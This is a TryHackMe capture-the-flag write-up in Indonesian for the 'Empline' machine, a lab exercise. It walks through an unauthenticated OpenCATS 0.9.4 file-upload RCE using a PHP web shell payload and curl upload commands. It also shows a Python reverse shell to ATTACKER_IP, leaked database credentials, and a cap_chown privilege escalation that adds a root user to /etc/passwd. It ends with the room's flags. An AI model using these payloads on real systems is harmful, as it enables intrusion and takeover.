# Empline — TryHackMe Writeup

**Target:** Empline  
**Platform:** TryHackMe  
**Difficulty:** Medium  
**Kategori:** Web Enumeration, Virtual Host Discovery, OpenCATS, Unauthenticated File Upload, Remote Code Execution, MariaDB Credential Discovery, MD5 Hash Cracking, Linux Capabilities (cap_chown), Privilege Escalation

---

## Recon

Seperti biasa, saya mulai dari Nmap untuk melakukan port scanning sekaligus enumerasi service dan versinya.

```bash
sudo nmap -sS -sC -sV --reason -o nmap TARGET_IP
```

![port](images/port.png)

Hasil scanning menunjukkan 3 port yang terbuka:

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
3306/tcp open  mysql   MariaDB 5.5.5-10.1.48
```

Beberapa hal yang langsung bisa saya simpulkan dari output ini:

- **SSH versi lama (7.6p1)** dengan Ubuntu 18.04 (Bionic) — target masih mengekspos port SSH ke publik, artinya kalau nanti dapat kredensial, jalur SSH kemungkinan besar terbuka.
- **Apache 2.4.29 + Ubuntu** — basis stack-nya PHP, jadi saya mengantisipasi attack path di sisi web (upload, LFI, dsb).
- **MariaDB 10.1.48 terbuka ke luar (3306)** — ini menarik. Database yang seharusnya hanya localhost justru terekspos, sehingga kalau kredensialnya ketemu, kita bisa akses DB langsung dari mesin attacker tanpa harus lewat shell dulu.

Selanjutnya saya melanjutkan recon pada service web yang berjalan di port 80.

---

## Web Enumeration

Saya membuka halaman utama di port 80. Dari sisi tampilan tidak ada apa-apa yang mencolok — hanya halaman sederhana bertema perusahaan. Namun saat saya membaca **source HTML**-nya, saya menemukan sebuah URL yang tidak terlihat di tampilan:

```text
http://job.empline.thm/careers
```

![html](images/html.png)

Ini poin penting pertama. URL tersebut menggunakan hostname internal `job.empline.thm`, bukan IP target. Artinya aplikasi ini bergantung pada **virtual host** — kalau kita akses lewat IP langsung, kita akan selalu mendarat di halaman default. Untuk bisa membuka aplikasi yang sebenarnya, hostname tersebut harus di-resolve ke IP target.

Saya menambahkan entry berikut ke `/etc/hosts`:

```text
TARGET_IP job.empline.thm
```

Setelah itu saya membuka `http://job.empline.thm/careers`. Di root directory-nya terdapat sebuah login page yang menampilkan versi aplikasi secara terbuka:

```text
OpenCATS Version 0.9.4 Countach
```

![opencats](images/opencats.png)

**OpenCATS** adalah applicant tracking system (ATS) berbasis PHP yang dipakai untuk mengelola lowongan dan lamaran kerja. Versi yang terpasang, **0.9.4 Countach**, adalah versi lama yang sudah lama tidak diperbarui. Versi inilah yang menjadi kunci tahap berikutnya.

---

## Initial Foothold — OpenCATS RCE

Setelah mencari informasi mengenai versi OpenCATS 0.9.4, saya menemukan bahwa versi ini rentan terhadap **Remote Code Execution** melalui *unauthenticated file upload* pada career portal (CVE-2021-41560; beberapa sumber juga merujuknya sebagai CVE-2021-47936).

Inti dari kerentanan ini:

- Career portal (*public job application*) bisa diakses **tanpa login** — siapa pun yang bisa melihat lowongan bisa mengirim lamaran.
- Form lamaran menerima **attachment berupa resume**, dan server **tidak memvalidasi ekstensi maupun content type** dari file yang di-upload.
- File yang di-upload disimpan di direktori yang bisa diakses lewat web, sehingga file PHP yang berhasil di-upload bisa langsung di-request dan dieksekusi oleh interpreter PHP.

Kombinasi "tidak butuh autentikasi" + "upload tanpa validasi tipe file" inilah yang mengubah form publik menjadi primitive eksekusi command.

Untuk melakukan testing, saya menggunakan exploit yang tersedia di [RevCat](https://github.com/Nickguitar/RevCAT)

Exploit dijalankan dengan cara berikut:

```bash
bash RevCAT.sh http://job.empline.thm
```

Cara kerja exploit ini (supaya tidak sekadar "jalanin skrip orang"):

1. **Bikin payload** yang diawali magic bytes `GIF87a` supaya lewat pemeriksaan tipe file yang dangkal, diikuti kode PHP `system($_REQUEST[0])`:

   ```php
   GIF87a<?php echo system($_REQUEST[0]); ?>
   ```

2. **Upload payload sebagai resume** ke endpoint lamaran menggunakan multipart form, dengan content type yang dipaksa jadi PHP:

   ```bash
   curl -skL http://job.empline.thm/ -H "Connection: close" \
     -F resumeFile=@shell;type=application/x-php \
     -F ID="<jobID>" -F candidateID="-1" \
     -F applyToJobSubAction="resumeLoad" --insecure
   ```

   Perhatikan `applyToJobSubAction=resumeLoad` — action inilah yang memicu jalur upload resume, dan `candidateID=-1` dipakai untuk mengaku sebagai kandidat anonim.

3. **Trigger eksekusi** dengan POST ke file yang sudah di-upload, mengirim command di parameter `0`:

   ```bash
   curl -skL -X POST -d "0=id" http://job.empline.thm/upload/<file>
   ```

Hasilnya command benar-benar dieksekusi di server:

![rce](images/rce.png)

Shell berbasis HTTP ini sudah cukup untuk membuktikan RCE, tapi tidak nyaman untuk enumerasi lanjutan.

---

## Reverse Shell

Karena shell dari exploit masih berbasis HTTP command execution (tiap command = 1 request, tidak ada TTY, tidak bisa `cd` secara persist), saya beralih ke reverse shell **Python** agar bisa mendapatkan pseudo-terminal (`pty`) dan leluasa melakukan enumerasi.

Payload yang dijalankan pada target:

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",9004));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

Listener pada mesin attacker:

```bash
nc -lvnp 9004
```

![revshell](images/revshell.png)

Dengan shell ini proses enumerasi jauh lebih nyaman: saya bisa berpindah direktori, membaca file, dan menjalankan perintah tanpa batasan stateless.

---

## Credential Discovery — Database

Setelah mendapatkan reverse shell, langkah pertama yang saya lakukan adalah menyisir file konfigurasi aplikasi. Ini biasanya tempat paling cepat untuk menemukan kredensial, karena aplikasi butuh koneksi ke database dan kredensialnya disimpan dalam bentuk plaintext di config.

Benar saja, di lokasi berikut saya menemukan kredensial database:

```text
/var/www/opencats/config.php
```

Isi konfigurasinya:

```php
/* Database configuration. */
define('DATABASE_USER', 'james');
define('DATABASE_PASS', 'ng6pUFvsGNtw');
define('DATABASE_HOST', 'localhost');
define('DATABASE_NAME', 'opencats');
```

Di sini ada satu hal yang perlu ditegaskan supaya tidak keliru membaca: **`james` di atas adalah user database, bukan user sistem.** Jadi kredensial ini belum tentu bisa dipakai untuk login ke box — yang bisa kita lakukan adalah memakainya untuk masuk ke MariaDB.

Karena port 3306 terbuka ke luar (terlihat di hasil Nmap), saya bisa langsung masuk ke database dan menyisir tabel user. Dari penelusuran tersebut saya menemukan **3 kandidat user beserta password hash**-nya.

![db](images/db.png)

Hash yang ditemukan berformat 32 karakter heksadesimal (**MD5**), sehingga cukup dicoba ke **CrackStation** tanpa perlu brute force di mesin sendiri.

Dari 3 hash tersebut, hanya **1 yang berhasil di-crack**, yaitu password milik user **george**.

![crack](images/crack.png)

Di sini ada catatan penting soal efisiensi: daripada menghabiskan waktu brute force SSH untuk ketiga username, mencoba hasil crack ke SSH terlebih dahulu adalah langkah paling murah. Dan benar, kredensial `george` valid untuk login.

---

## Lateral Movement — User `george`

Dengan credential hasil crack, saya berhasil login sebagai user `george`.

Setelah login, saya melakukan enumerasi manual terlebih dahulu (cek home directory, file yang menarik, `sudo -l`, cron, dan isi `/etc/passwd`), tetapi tidak menemukan hal yang langsung menonjol. Karena itu saya melanjutkan enumerasi menggunakan **LinPEAS** untuk menyapu konfigurasi yang mudah terlewat — permission file, SUID, cron, sampai capability.

![linpeas](images/linpeas.png)

LinPEAS di sini berfungsi sebagai *second pass*: manusia cenderung melewatkan file konfigurasi kecil, sementara LinPEAS menyisir ratusan lokasi sekaligus dan menandai temuan yang relevan.

---

## Privilege Escalation — Linux Capabilities (`cap_chown`) pada Ruby

Dari hasil LinPEAS, ditemukan vektor yang tidak biasa: binary **ruby** memiliki capability `cap_chown`.

Apa artinya? `cap_chown` adalah Linux capability yang mengizinkan sebuah proses untuk **mengubah kepemilikan (ownership) file** — operasi `chown()` yang normalnya cuma bisa dilakukan oleh root. Karena capability ini menempel pada binary `ruby`, siapa pun yang bisa menjalankan `ruby` akan **mewarisi** kemampuan `chown` root selama proses itu berjalan.

Rencana saya:

1. Ubah ownership `/etc/passwd` menjadi milik kita, supaya file itu writable.
2. Sisipkan user baru dengan UID/GID `0` (root) dan password yang kita tentukan sendiri.

Langkah pertama — ubah kepemilikan `/etc/passwd` memakai capability yang menempel di ruby:

```bash
ruby -e 'File.chown(1002, 1002, "/etc/passwd")'
```

Verifikasi bahwa ownership sudah benar-benar berubah:

```text
-rw-r--r-- 1 george george 1660 Jul 20  2021 /etc/passwd
```

Perhatikan: `/etc/passwd` sekarang dimiliki `george` (UID 1002), padahal aslinya `root`. Ini bukti bahwa capability `cap_chown` benar-benar bisa kita manfaatkan.

Langkah kedua — siapkan password hash untuk user baru. Saya menggunakan format **MD5-crypt (`-1`)** lewat `openssl`:

```bash
openssl passwd -1 -salt root root
```

Hasilnya:

```text
$1$root$9gr5KxwuEdiI80GtIzd.U0
```

Langkah ketiga — tambahkan baris user baru ke `/etc/passwd`. Perhatikan field UID dan GID yang saya set ke `0` supaya user ini otomatis punya privilege root:

```text
pwn:$1$root$9gr5KxwuEdiI80GtIzd.U0:0:0:root:/:/bin/bash
```

Urutan field-nya: `username : password : UID : GID : comment : home : shell`.

Langkah terakhir — login ke user yang baru dibuat:

```bash
su pwn
```

Login berhasil dan saya langsung mendapatkan akses root tanpa perlu password milik `george` lagi.

![root](images/root.png)

---

## Flags

### User

```text
91cb89c70aa2e5ce0e0116dab099078e
```

### Root

```text
74fea7cd0556e9c6f22e6f54bc68f5d5
```

